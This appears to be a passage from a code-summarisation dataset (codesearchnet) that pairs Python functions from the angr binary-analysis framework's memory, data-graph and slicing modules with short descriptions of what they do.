self.state.solver.BVV(size_e, self.state.arch.bits)\n        elif size_e is None:\n            size_e = self.state.solver.BVV(data_e.size() // self.state.arch.byte_width, self.state.arch.bits)\n\n        if len(data_e) % self.state.arch.byte_width != 0:\n            raise SimMemoryError(\"Attempting to store non-byte data to memory\")\n        if not size_e.symbolic and (len(data_e) < size_e*self.state.arch.byte_width).is_true():\n            raise SimMemoryError(\"Provided data is too short for this memory store\")\n\n        if _inspect:\n            if self.category == 'reg':\n                self.state._inspect(\n                    'reg_write',\n                    BP_BEFORE,\n                    reg_write_offset=addr_e,\n                    reg_write_length=size_e,\n                    reg_write_expr=data_e,\n                    reg_write_condition=condition_e,\n                )\n                addr_e = self.state._inspect_getattr('reg_write_offset', addr_e)\n                size_e = self.state._inspect_getattr('reg_write_length', size_e)\n                data_e = self.state._inspect_getattr('reg_write_expr', data_e)\n                condition_e = self.state._inspect_getattr('reg_write_condition', condition_e)\n            elif self.category == 'mem':\n                self.state._inspect(\n                    'mem_write',\n                    BP_BEFORE,\n                    mem_write_address=addr_e,\n                    mem_write_length=size_e,\n                    mem_write_expr=data_e,\n                    mem_write_condition=condition_e,\n                )\n                addr_e = self.state._inspect_getattr('mem_write_address', addr_e)\n                size_e = self.state._inspect_getattr('mem_write_length', size_e)\n                data_e = self.state._inspect_getattr('mem_write_expr', data_e)\n                condition_e = self.state._inspect_getattr('mem_write_condition', condition_e)\n\n        # if the condition is false, bail\n        if condition_e is not None and self.state.solver.is_false(condition_e):\n            if priv is not None: self.state.scratch.pop_priv()\n            return\n\n        if (\n            o.UNDER_CONSTRAINED_SYMEXEC in self.state.options and\n            isinstance(addr_e, claripy.ast.Base) and\n            addr_e.uninitialized\n        ):\n            self._constrain_underconstrained_index(addr_e)\n\n        request = MemoryStoreRequest(addr_e, data=data_e, size=size_e, condition=condition_e, endness=endness)\n        try:\n            self._store(request) #will use state_plugins/symbolic_memory.py\n        except SimSegfaultError as e:\n            e.original_addr = addr_e\n            raise\n\n        if _inspect:\n            if self.category == 'reg': self.state._inspect('reg_write', BP_AFTER)\n            elif self.category == 'mem': self.state._inspect('mem_write', BP_AFTER)\n            # tracer uses address_concretization_add_constraints\n            add_constraints = self.state._inspect_getattr('address_concretization_add_constraints', add_constraints)\n\n        if add_constraints and len(request.constraints) > 0:\n            self.state.add_constraints(*request.constraints)\n\n        if not disable_actions:\n            if request.completed and o.AUTO_REFS in self.state.options and action is None and not self._abstract_backer:\n                ref_size = size * self.state.arch.byte_width if size is not None else data_e.size()\n                region_type = self.category\n                if region_type == 'file':\n                    # Special handling for files to keep compatibility\n                    # We may use some refactoring later\n                    region_type = self.id\n                action = SimActionData(self.state, region_type, 'write', addr=addr_e, data=data_e, size=ref_size,\n                                       condition=condition\n                                       )\n                self.state.history.add_action(action)\n\n            if request.completed and action is not None:\n                action.actual_addrs = request.actual_addresses\n                action.actual_value = action._make_object(request.stored_values[0]) # TODO\n                if len(request.constraints) > 0:\n                    action.added_constraints = action._make_object(self.state.solver.And(*request.constraints))\n                else:\n                    action.added_constraints = action._make_object(self.state.solver.true)\n\n        if priv is not None: self.state.scratch.pop_priv()", "response": "Stores the content of the specified data at the specified address."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nstores the contents of a bitvector into memory.", "response": "def store_cases(self, addr, contents, conditions, fallback=None, add_constraints=None, endness=None, action=None):\n        \"\"\"\n        Stores content into memory, conditional by case.\n\n        :param addr:            A claripy expression representing the address to store at.\n        :param contents:        A list of bitvectors, not necessarily of the same size. Use None to denote an empty\n                                write.\n        :param conditions:      A list of conditions. Must be equal in length to contents.\n\n        The following parameters are optional.\n\n        :param fallback:        A claripy expression representing what the write should resolve to if all conditions\n                                evaluate to false (default: whatever was there before).\n        :param add_constraints: Add constraints resulting from the merge (default: True)\n        :param endness:         The endianness for contents as well as fallback.\n        :param action:          A SimActionData to fill out with the final written value and constraints.\n        :type action:           SimActionData\n        \"\"\"\n\n        if fallback is None and all(c is None for c in contents):\n            l.debug(\"Avoiding an empty write.\")\n            return\n\n        addr_e = _raw_ast(addr)\n        contents_e = _raw_ast(contents)\n        conditions_e = _raw_ast(conditions)\n        fallback_e = _raw_ast(fallback)\n\n        max_bits = max(c.length for c in contents_e if isinstance(c, claripy.ast.Bits)) \\\n            if fallback is None else fallback.length\n\n        # if fallback is not provided by user, load it from memory\n        # remember to specify the endianness!\n        fallback_e = self.load(addr, max_bits//self.state.arch.byte_width, add_constraints=add_constraints, endness=endness) \\\n            if fallback_e is None else fallback_e\n\n        req = self._store_cases(addr_e, contents_e, conditions_e, fallback_e, endness=endness)\n        add_constraints = self.state._inspect_getattr('address_concretization_add_constraints', add_constraints)\n        if add_constraints:\n            self.state.add_constraints(*req.constraints)\n\n        if req.completed and o.AUTO_REFS in self.state.options and action is None:\n            region_type = self.category\n            if region_type == 'file':\n                # Special handling for files to keep compatibility\n                # We may use some refactoring later\n                region_type = self.id\n            action = SimActionData(self.state, region_type, 'write', addr=addr_e, data=req.stored_values[-1],\n                                   size=max_bits, condition=self.state.solver.Or(*conditions), fallback=fallback\n                                   )\n            self.state.history.add_action(action)\n\n        if req.completed and action is not None:\n            action.actual_addrs = req.actual_addresses\n            action.actual_value = action._make_object(req.stored_values[-1])\n            action.added_constraints = action._make_object(self.state.solver.And(*req.constraints)\n                                                           if len(req.constraints) > 0 else self.state.solver.true)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load(self, addr, size=None, condition=None, fallback=None, add_constraints=None, action=None, endness=None,\n             inspect=True, disable_actions=False, ret_on_segv=False):\n        \"\"\"\n        Loads size bytes from dst.\n\n        :param dst:             The address to load from.\n        :param size:            The size (in bytes) of the load.\n        :param condition:       A claripy expression representing a condition for a conditional load.\n        :param fallback:        A fallback value if the condition ends up being False.\n        :param add_constraints: Add constraints resulting from the merge (default: True).\n        :param action:          A SimActionData to fill out with the constraints.\n        :param endness:         The endness to load with.\n        :param bool inspect:    Whether this store should trigger SimInspect breakpoints or not.\n        :param bool disable_actions: Whether this store should avoid creating SimActions or not. When set to False,\n                                     state options are respected.\n        :param bool ret_on_segv: Whether returns the memory that is already loaded before a segmentation fault is triggered. The default is False.\n\n        There are a few possible return values. If no condition or fallback are passed in,\n        then the return is the bytes at the address, in the form of a claripy expression.\n        For example:\n\n            <A BVV(0x41, 32)>\n\n        On the other hand, if a condition and fallback are provided, the value is conditional:\n\n            <A If(condition, BVV(0x41, 32), fallback)>\n        \"\"\"\n\n        _inspect = inspect and self.state.supports_inspect\n\n        add_constraints = True if add_constraints is None else add_constraints\n\n        addr_e = _raw_ast(addr)\n        size_e = _raw_ast(size)\n        condition_e = _raw_ast(condition)\n        fallback_e = _raw_ast(fallback)\n\n        if isinstance(addr, str):\n            named_addr, named_size = self._resolve_location_name(addr)\n            addr = named_addr\n            addr_e = addr\n            if size is None:\n                size = named_size\n                size_e = size\n\n        if size is None:\n            size = self.state.arch.bits // self.state.arch.byte_width\n            size_e = size\n\n        if _inspect:\n            if self.category == 'reg':\n                self.state._inspect('reg_read', BP_BEFORE, reg_read_offset=addr_e, reg_read_length=size_e,\n                                    reg_read_condition=condition_e\n                                    )\n                addr_e = self.state._inspect_getattr(\"reg_read_offset\", addr_e)\n                size_e = self.state._inspect_getattr(\"reg_read_length\", size_e)\n                condition_e = self.state._inspect_getattr(\"reg_read_condition\", condition_e)\n\n            elif self.category == 'mem':\n                self.state._inspect('mem_read', BP_BEFORE, mem_read_address=addr_e, mem_read_length=size_e,\n                                    mem_read_condition=condition_e\n                                    )\n                addr_e = self.state._inspect_getattr(\"mem_read_address\", addr_e)\n                size_e = self.state._inspect_getattr(\"mem_read_length\", size_e)\n                condition_e = self.state._inspect_getattr(\"mem_read_condition\", condition_e)\n\n        if (\n            o.UNDER_CONSTRAINED_SYMEXEC in self.state.options and\n            isinstance(addr_e, claripy.ast.Base) and\n            addr_e.uninitialized\n        ):\n            self._constrain_underconstrained_index(addr_e)\n\n        try:\n            a,r,c = self._load(addr_e, size_e, condition=condition_e, fallback=fallback_e, inspect=_inspect,\n                               events=not disable_actions, ret_on_segv=ret_on_segv)\n        except SimSegfaultError as e:\n            e.original_addr = addr_e\n            raise\n        if _inspect:\n            # tracer uses address_concretization_add_constraints to overwrite the add_constraints value\n            # TODO: Make this logic less arbitrary\n            add_constraints = self.state._inspect_getattr('address_concretization_add_constraints', add_constraints)\n        if add_constraints and c:\n            self.state.add_constraints(*c)\n\n        if (self.category == 'mem' and o.SIMPLIFY_MEMORY_READS in self.state.options) or \\\n           (self.category == 'reg' and o.SIMPLIFY_REGISTER_READS in self.state.options):  # pylint:disable=too-many-boolean-expressions\n            l.debug(\"simplifying %s read...\", self.category)\n            r = self.state.simplify(r)\n\n        if not self._abstract_backer and \\\n                o.UNINITIALIZED_ACCESS_AWARENESS in self.state.options and \\\n                self.state.uninitialized_access_handler is not None and \\\n                (r.op == 'Reverse' or r.op == 'BVV') and \\\n                getattr(r._model_vsa, 'uninitialized', False):\n            normalized_addresses = self.normalize_address(addr)\n            if len(normalized_addresses) > 0 and type(normalized_addresses[0]) is AddressWrapper:\n                normalized_addresses = [ (aw.region, aw.address) for aw in normalized_addresses ]\n            self.state.uninitialized_access_handler(self.category, normalized_addresses, size, r, self.state.scratch.bbl_addr, self.state.scratch.stmt_idx)\n\n        # the endianess\n        endness = self.endness if endness is None else endness\n        if endness == \"Iend_LE\":\n            r = r.reversed\n\n        if _inspect:\n            if self.category == 'mem':\n                self.state._inspect('mem_read', BP_AFTER, mem_read_expr=r)\n                r = self.state._inspect_getattr(\"mem_read_expr\", r)\n\n            elif self.category == 'reg':\n                self.state._inspect('reg_read', BP_AFTER, reg_read_expr=r)\n                r = self.state._inspect_getattr(\"reg_read_expr\", r)\n\n        if not disable_actions:\n            if o.AST_DEPS in self.state.options and self.category == 'reg':\n                r = SimActionObject(r, reg_deps=frozenset((addr,)))\n\n            if o.AUTO_REFS in self.state.options and action is None:\n                ref_size = size * self.state.arch.byte_width if size is not None else r.size()\n                region_type = self.category\n                if region_type == 'file':\n                    # Special handling for files to keep compatibility\n                    # We may use some refactoring later\n                    region_type = self.id\n                action = SimActionData(self.state, region_type, 'read', addr=addr, data=r, size=ref_size,\n                                       condition=condition, fallback=fallback)\n                self.state.history.add_action(action)\n\n            if action is not None:\n                action.actual_addrs = a\n                action.added_constraints = action._make_object(self.state.solver.And(*c)\n                                                               if len(c) > 0 else self.state.solver.true)\n\n        return r", "response": "Load a memory area from the specified address."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find(self, addr, what, max_search=None, max_symbolic_bytes=None, default=None, step=1,\n             disable_actions=False, inspect=True, chunk_size=None):\n        \"\"\"\n        Returns the address of bytes equal to 'what', starting from 'start'. Note that,  if you don't specify a default\n        value, this search could cause the state to go unsat if no possible matching byte exists.\n\n        :param addr:               The start address.\n        :param what:                What to search for;\n        :param max_search:          Search at most this many bytes.\n        :param max_symbolic_bytes:  Search through at most this many symbolic bytes.\n        :param default:             The default value, if what you're looking for wasn't found.\n        :param step:                The stride that the search should use while scanning memory\n        :param disable_actions:     Whether to inhibit the creation of SimActions for memory access\n        :param inspect:             Whether to trigger SimInspect breakpoints\n\n        :returns:                   An expression representing the address of the matching byte.\n        \"\"\"\n        addr = _raw_ast(addr)\n        what = _raw_ast(what)\n        default = _raw_ast(default)\n\n        if isinstance(what, bytes):\n            # Convert it to a BVV\n            what = claripy.BVV(what, len(what) * self.state.arch.byte_width)\n\n        r,c,m = self._find(addr, what, max_search=max_search, max_symbolic_bytes=max_symbolic_bytes, default=default,\n                           step=step, disable_actions=disable_actions, inspect=inspect, chunk_size=chunk_size)\n        if o.AST_DEPS in self.state.options and self.category == 'reg':\n            r = SimActionObject(r, reg_deps=frozenset((addr,)))\n\n        return r,c,m", "response": "Searches for a given byte in memory and returns the address of the matching byte."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncopies the contents of src into dst within a memory.", "response": "def copy_contents(self, dst, src, size, condition=None, src_memory=None, dst_memory=None, inspect=True,\n                      disable_actions=False):\n        \"\"\"\n        Copies data within a memory.\n\n        :param dst:         A claripy expression representing the address of the destination\n        :param src:         A claripy expression representing the address of the source\n\n        The following parameters are optional.\n\n        :param src_memory:  Copy data from this SimMemory instead of self\n        :param src_memory:  Copy data to this SimMemory instead of self\n        :param size:        A claripy expression representing the size of the copy\n        :param condition:   A claripy expression representing a condition, if the write should be conditional. If this\n                            is determined to be false, the size of the copy will be 0.\n        \"\"\"\n        dst = _raw_ast(dst)\n        src = _raw_ast(src)\n        size = _raw_ast(size)\n        condition = _raw_ast(condition)\n\n        return self._copy_contents(dst, src, size, condition=condition, src_memory=src_memory, dst_memory=dst_memory,\n                                   inspect=inspect, disable_actions=disable_actions)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the VFGNode at the given address or None if no such node exists.", "response": "def _vfg_node(self, addr):\n        \"\"\"\n        Gets vfg node at @addr\n        Returns VFGNode or None\n        \"\"\"\n        for n in self._vfg._nodes.values():\n            if n.addr == addr:\n                return n\n        raise DataGraphError(\"No VFG node at 0x%x\" % addr)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _branch(self, live_defs, node, path=\"\"):\n\n        irsb = self._irsb(node.state)\n        path = path + \" -> \" + hex(irsb.addr)\n\n        if isinstance(irsb, SimProcedure):\n            self._simproc_map[irsb.addr] = repr(irsb)\n\n        l.debug(\"--> Branch: running block 0x%x\" % irsb.addr)\n        block = self._make_block(irsb, live_defs)\n        self._imarks.update(block._imarks)\n        if block.stop == True:\n            #l.debug(\" ### Stopping at block 0x%x\" % (irsb.addr))\n            l.debug(\" ### End of path %s\" % path)\n            return irsb.addr\n        succ = self._vfg._graph.successors(node)\n\n        defer = []\n        for s in succ:\n            # Consider fake returns last\n            if self._vfg._graph.edge[node][s]['jumpkind'] == 'Ijk_FakeRet':\n                defer.append(s)\n                continue\n            # We need to make a copy of the dict !\n            self._branch(dict(block.live_defs), s, path)\n\n            # We explore every other paths before taking fake rets.\n            # Ideally, we want to take fake rets only when functions don't\n            # return.\n            for s in defer:\n                self._branch(dict(block.live_defs), s, path)", "response": "Recursive function that branches in every possible path in the VFG."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets a list of abstract locations that are within the range of addr and addr + size.", "response": "def get_abstract_locations(self, addr, size):\n        \"\"\"\n        Get a list of abstract locations that is within the range of [addr, addr + size]\n\n        This implementation is pretty slow. But since this method won't be called frequently, we can live with the bad\n        implementation for now.\n\n        :param addr:    Starting address of the memory region.\n        :param size:    Size of the memory region, in bytes.\n        :return:        A list of covered AbstractLocation objects, or an empty list if there is none.\n        \"\"\"\n\n        ret = [ ]\n        for aloc in self._alocs.values():\n            for seg in aloc.segments:\n                if seg.offset >= addr and seg.offset < addr + size:\n                    ret.append(aloc)\n                    break\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef dbg_print(self, indent=0):\n        print(\"%sA-locs:\" % (\" \" * indent))\n        for aloc_id, aloc in self._alocs.items():\n            print(\"%s<0x%x> %s\" % (\" \" * (indent + 2), aloc_id, aloc))\n\n        print(\"%sMemory:\" % (\" \" * indent))\n        self.memory.dbg_print(indent=indent + 2)", "response": "Print out debugging information for this object."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _region_base(self, region):\n\n        if region == 'global':\n            region_base_addr = 0\n        elif region.startswith('stack_'):\n            region_base_addr = self._stack_region_map.absolutize(region, 0)\n        else:\n            region_base_addr = self._generic_region_map.absolutize(region, 0)\n\n        return region_base_addr", "response": "Get the base address of a memory region."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create_region(self, key, state, is_stack, related_function_addr, endness, backer_dict=None):\n\n        self._regions[key] = MemoryRegion(key,\n                                          state=state,\n                                          is_stack=is_stack,\n                                          related_function_addr=related_function_addr,\n                                          endness=endness,\n                                          backer_dict=backer_dict,\n                                          )", "response": "Create a new MemoryRegion with the specified key and store it in self. _regions."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\noverrides the SimStatePlugin. set_state method.", "response": "def set_state(self, state):\n        \"\"\"\n        Overriding the SimStatePlugin.set_state() method\n\n        :param state: A SimState object\n        :return: None\n        \"\"\"\n\n        # Sanity check\n        if REGION_MAPPING not in state.options:\n            # add REGION_MAPPING into state.options\n            l.warning('Option \"REGION_MAPPING\" must be enabled when using SimAbstractMemory as the memory model. '\n                      'The option is added to state options as a courtesy.'\n                      )\n            state.options.add(REGION_MAPPING)\n\n        SimMemory.set_state(self, state)\n\n        for _,v in self._regions.items():\n            v.set_state(state)\n\n        # Delayed initialization of backer argument from __init__\n        if self._temp_backer is not None:\n            for region, backer_dict in self._temp_backer.items():\n                self._regions[region] = MemoryRegion(region, self.state,\n                                                     init_memory=True,\n                                                     backer_dict=backer_dict,\n                                                     endness=self.endness\n                                                     )\n            self._temp_backer = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nnormalizes an address into a list of addresses.", "response": "def normalize_address(self, addr, is_write=False, convert_to_valueset=False, target_region=None, condition=None): #pylint:disable=arguments-differ\n        \"\"\"\n        Convert a ValueSet object into a list of addresses.\n\n        :param addr: A ValueSet object (which describes an address)\n        :param is_write: Is this address used in a write or not\n        :param convert_to_valueset: True if you want to have a list of ValueSet instances instead of AddressWrappers,\n                                    False otherwise\n        :param target_region: Which region to normalize the address to. To leave the decision to SimuVEX, set it to None\n        :return: A list of AddressWrapper or ValueSet objects\n        \"\"\"\n        targets_limit = WRITE_TARGETS_LIMIT if is_write else READ_TARGETS_LIMIT\n\n        if type(addr) is not int:\n            for constraint in self.state.solver.constraints:\n                if getattr(addr, 'variables', set()) & constraint.variables:\n                    addr = self._apply_condition_to_symbolic_addr(addr, constraint)\n\n        # Apply the condition if necessary\n        if condition is not None:\n            addr = self._apply_condition_to_symbolic_addr(addr, condition)\n\n        if type(addr) is int:\n            addr = self.state.solver.BVV(addr, self.state.arch.bits)\n\n        addr_with_regions = self._normalize_address_type(addr)\n        address_wrappers = [ ]\n\n        for region, addr_si in addr_with_regions:\n            concrete_addrs = addr_si.eval(targets_limit)\n\n            if len(concrete_addrs) == targets_limit and HYBRID_SOLVER in self.state.options:\n                exact = True if APPROXIMATE_FIRST not in self.state.options else None\n                solutions = self.state.solver.eval_upto(addr, targets_limit, exact=exact)\n\n                if len(solutions) < len(concrete_addrs):\n                    concrete_addrs = [addr_si.intersection(s).eval(1)[0] for s in solutions]\n\n            if len(concrete_addrs) == targets_limit:\n                self.state.history.add_event('mem', message='concretized too many targets. address = %s' % addr_si)\n\n            for c in concrete_addrs:\n                aw = self._normalize_address(region, c, target_region=target_region)\n                address_wrappers.append(aw)\n\n        if convert_to_valueset:\n            return [ i.to_valueset(self.state) for i in address_wrappers ]\n\n        else:\n            return address_wrappers"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _normalize_address_type(self, addr): #pylint:disable=no-self-use\n\n        addr_e = _raw_ast(addr)\n\n        if isinstance(addr_e, (claripy.bv.BVV, claripy.vsa.StridedInterval, claripy.vsa.ValueSet)):\n            raise SimMemoryError('_normalize_address_type() does not take claripy models.')\n\n        if isinstance(addr_e, claripy.ast.Base):\n            if not isinstance(addr_e._model_vsa, ValueSet):\n                # Convert it to a ValueSet first by annotating it\n                addr_e = addr_e.annotate(RegionAnnotation('global', 0, addr_e._model_vsa))\n\n            return addr_e._model_vsa.items()\n\n        else:\n            raise SimAbstractMemoryError('Unsupported address type %s' % type(addr_e))", "response": "Convert an address of different types to a list of mapping between region IDs and offsets."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting a list of segments that are available in memory for the given address and size.", "response": "def get_segments(self, addr, size):\n        \"\"\"\n        Get a segmented memory region based on AbstractLocation information available from VSA.\n\n        Here are some assumptions to make this method fast:\n            - The entire memory region [addr, addr + size] is located within the same MemoryRegion\n            - The address 'addr' has only one concrete value. It cannot be concretized to multiple values.\n\n        :param addr: An address\n        :param size: Size of the memory area in bytes\n        :return: An ordered list of sizes each segment in the requested memory region\n        \"\"\"\n\n        address_wrappers = self.normalize_address(addr, is_write=False)\n        # assert len(address_wrappers) > 0\n\n        aw = address_wrappers[0]\n        region_id = aw.region\n\n        if region_id in self.regions:\n            region = self.regions[region_id]\n            alocs = region.get_abstract_locations(aw.address, size)\n\n            # Collect all segments and sort them\n            segments = [ ]\n            for aloc in alocs:\n                segments.extend(aloc.segments)\n            segments = sorted(segments, key=lambda x: x.offset)\n\n            # Remove all overlapping segments\n            processed_segments = [ ]\n            last_seg = None\n            for seg in segments:\n                if last_seg is None:\n                    last_seg = seg\n                    processed_segments.append(seg)\n                else:\n                    # Are they overlapping?\n                    if seg.offset >= last_seg.offset and seg.offset <= last_seg.offset + size:\n                        continue\n                    processed_segments.append(seg)\n\n            # Make it a list of sizes\n            sizes = [ ]\n            next_pos = aw.address\n            for seg in processed_segments:\n                if seg.offset > next_pos:\n                    gap = seg.offset - next_pos\n                    assert gap > 0\n                    sizes.append(gap)\n                    next_pos += gap\n                if seg.size + next_pos > aw.address + size:\n                    sizes.append(aw.address + size - next_pos)\n                    next_pos += aw.address + size - next_pos\n                else:\n                    sizes.append(seg.size)\n                    next_pos += seg.size\n\n\n            if not sizes:\n                return [ size ]\n            return sizes\n        else:\n            # The region doesn't exist. Then there is only one segment!\n            return [ size ]"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmakes a copy of this SimAbstractMemory object.", "response": "def copy(self, memo):\n        \"\"\"\n        Make a copy of this SimAbstractMemory object\n        :return:\n        \"\"\"\n        am = SimAbstractMemory(\n            memory_id=self._memory_id,\n            endness=self.endness,\n            stack_region_map=self._stack_region_map,\n            generic_region_map=self._generic_region_map\n        )\n        for region_id, region in self._regions.items():\n            am._regions[region_id] = region.copy(memo)\n        am._stack_size = self._stack_size\n        return am"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef merge(self, others, merge_conditions, common_ancestor=None):\n        merging_occurred = False\n\n        for o in others:\n            for region_id, region in o._regions.items():\n                if region_id in self._regions:\n                    merging_occurred |= self._regions[region_id].merge(\n                        [region], merge_conditions, common_ancestor=common_ancestor\n                    )\n                else:\n                    merging_occurred = True\n                    self._regions[region_id] = region\n\n        return merging_occurred", "response": "Merge this guy with another guy."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dbg_print(self):\n        for region_id, region in self.regions.items():\n            print(\"Region [%s]:\" % region_id)\n            region.dbg_print(indent=2)", "response": "Print out debugging information about the current set of resources."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ninitializing the ptable for ctype_toupper_loc. c in libc implementation.", "response": "def _initialize_toupper_loc_table(self):\n        \"\"\"\n        Initialize ptable for ctype\n\n        See __ctype_toupper_loc.c in libc implementation\n        \"\"\"\n        malloc = angr.SIM_PROCEDURES['libc']['malloc']\n        # 384 entries, 4 bytes each\n        table = self.inline_call(malloc, 384*4).ret_expr\n        table_ptr = self.inline_call(malloc, self.state.arch.bytes).ret_expr\n\n        for pos, c in enumerate(self.state.libc.TOUPPER_LOC_ARRAY):\n            self.state.memory.store(table + (pos * 4),\n                                    self.state.solver.BVV(c, 32),\n                                    endness=self.state.arch.memory_endness,\n                                    inspect=False,\n                                    disable_actions=True,\n                                    )\n\n        # Offset for negative chars: -128 index (4 bytes per index)\n        table += (128 * 4)\n        self.state.memory.store(table_ptr,\n                                table,\n                                size=self.state.arch.bytes,\n                                endness=self.state.arch.memory_endness,\n                                inspect=False,\n                                disable_actions=True,\n                                )\n\n        self.state.libc.ctype_toupper_loc_table_ptr = table_ptr"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nextract the arguments and set them to", "response": "def _extract_args(state, main, argc, argv, init, fini):\n        \"\"\"\n        Extract arguments and set them to\n\n        :param angr.sim_state.SimState state: The program state.\n        :param main: An argument to __libc_start_main.\n        :param argc: An argument to __libc_start_main.\n        :param argv: An argument to __libc_start_main.\n        :param init: An argument to __libc_start_main.\n        :param fini: An argument to __libc_start_main.\n        :return: A tuple of five elements: (main, argc, argv, init, fini)\n        :rtype: tuple\n        \"\"\"\n\n        main_ = main\n        argc_ = argc\n        argv_ = argv\n        init_ = init\n        fini_ = fini\n\n        if state.arch.name == \"PPC32\":\n            # for some dumb reason, PPC passes arguments to libc_start_main in some completely absurd way\n            argv_ = argc_\n            argc_ = main_\n            main_ = state.mem[state.regs.r8 + 4:].int.resolved\n            init_ = state.mem[state.regs.r8 + 8:].int.resolved\n            fini_ = state.mem[state.regs.r8 + 12:].int.resolved\n\n        elif state.arch.name == \"PPC64\":\n            main_ = state.mem[state.regs.r8 + 8:].long.resolved\n            init_ = state.mem[state.regs.r8 + 16:].long.resolved\n            fini_ = state.mem[state.regs.r8 + 24:].long.resolved\n\n        return main_, argc_, argv_, init_, fini_"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dbg_repr(self, max_display=10):\n\n        s = repr(self) + \"\\n\"\n\n        if len(self.chosen_statements) > max_display:\n            s += \"%d SimRuns in program slice, displaying %d.\\n\" % (len(self.chosen_statements), max_display)\n        else:\n            s += \"%d SimRuns in program slice.\\n\" % len(self.chosen_statements)\n\n        # Pretty-print the first `max_display` basic blocks\n        if max_display is None:\n            # Output all\n            run_addrs = sorted(self.chosen_statements.keys())\n\n        else:\n            # Only output the first \"max_display\" ones\n            run_addrs = sorted(self.chosen_statements.keys())[ : max_display]\n\n        for run_addr in run_addrs:\n            s += self.dbg_repr_run(run_addr) + \"\\n\"\n\n        return s", "response": "Returns a string representation of the current slice."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef dbg_repr_run(self, run_addr):\n\n        if self.project.is_hooked(run_addr):\n            ss = \"%#x Hooked\\n\" % run_addr\n\n        else:\n            ss = \"%#x\\n\" % run_addr\n\n            # statements\n            chosen_statements = self.chosen_statements[run_addr]\n\n            vex_block = self.project.factory.block(run_addr).vex\n\n            statements = vex_block.statements\n            for i in range(0, len(statements)):\n                if i in chosen_statements:\n                    line = \"+\"\n                else:\n                    line = \"-\"\n                line += \"[% 3d] \" % i\n                line += str(statements[i])\n                ss += line + \"\\n\"\n\n            # exits\n            targets = self.chosen_exits[run_addr]\n            addr_strs = [ ]\n            for exit_stmt_id, target_addr in targets:\n                if target_addr is None:\n                    addr_strs.append(\"default\")\n                else:\n                    addr_strs.append(\"%#x\" % target_addr)\n\n            ss += \"Chosen exits: \" + \", \".join(addr_strs)\n\n        return ss", "response": "Returns a string representation of a single SimRun slice."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning an AnnotatedCFG based on slicing result.", "response": "def annotated_cfg(self, start_point=None):\n        \"\"\"\n        Returns an AnnotatedCFG based on slicing result.\n        \"\"\"\n\n        # TODO: Support context-sensitivity\n\n        targets = [ ]\n\n        for simrun, stmt_idx in self._targets:\n            targets.append((simrun.addr, stmt_idx))\n\n        l.debug(\"Initializing AnnoCFG...\")\n        anno_cfg = AnnotatedCFG(self.project, self._cfg)\n\n        for simrun, stmt_idx in self._targets:\n            if stmt_idx is not -1:\n                anno_cfg.set_last_statement(simrun.addr, stmt_idx)\n\n        for n in self._cfg.graph.nodes():\n            run = n\n\n            if run.addr in self.chosen_statements:\n                if self.chosen_statements[run.addr] is True:\n                    anno_cfg.add_block_to_whitelist(run.addr)\n                else:\n                    anno_cfg.add_statements_to_whitelist(run.addr, self.chosen_statements[run.addr])\n\n        for src, dst in self._cfg.graph.edges():\n            run = src\n\n            if dst.addr in self.chosen_statements and src.addr in self.chosen_statements:\n                anno_cfg.add_exit_to_whitelist(run.addr, dst.addr)\n\n        return anno_cfg"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef is_taint_related_to_ip(self, simrun_addr, stmt_idx, taint_type, simrun_whitelist=None):\n\n        if simrun_whitelist is None:\n            simrun_whitelist = set()\n        if type(simrun_whitelist) is not set:\n            simrun_whitelist = set(simrun_whitelist)\n\n        # Find the specific taint in our graph\n        taint = None\n        for n in self.taint_graph.nodes():\n            if n.type == taint_type and n.addr == simrun_addr and n.stmt_id == stmt_idx:\n                taint = n\n                break\n\n        if taint is None:\n            raise AngrBackwardSlicingError('The specific taint is not found')\n\n        bfs_tree = networkx.bfs_tree(self.taint_graph, taint)\n\n        # A node is tainting the IP if one of the following criteria holds:\n        # - a descendant tmp variable is used as a default exit or a conditional exit of its corresponding SimRun\n        # - a descendant register is the IP itself\n\n        for descendant in bfs_tree.nodes():\n            if descendant.type == 'exit':\n                if descendant.addr not in simrun_whitelist:\n                    return True\n            elif descendant.type == 'reg' and descendant.reg == self.project.arch.ip_offset:\n                return True\n\n        return False", "response": "Checks if a specific taint will taint the IP in the future or not."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _construct(self, targets, control_flow_slice=False):\n\n        if control_flow_slice:\n            simruns = [ r for r, _ in targets ]\n            self._construct_control_flow_slice(simruns)\n\n        else:\n            self._construct_default(targets)", "response": "Construct a dependency graph based on given parameters."}
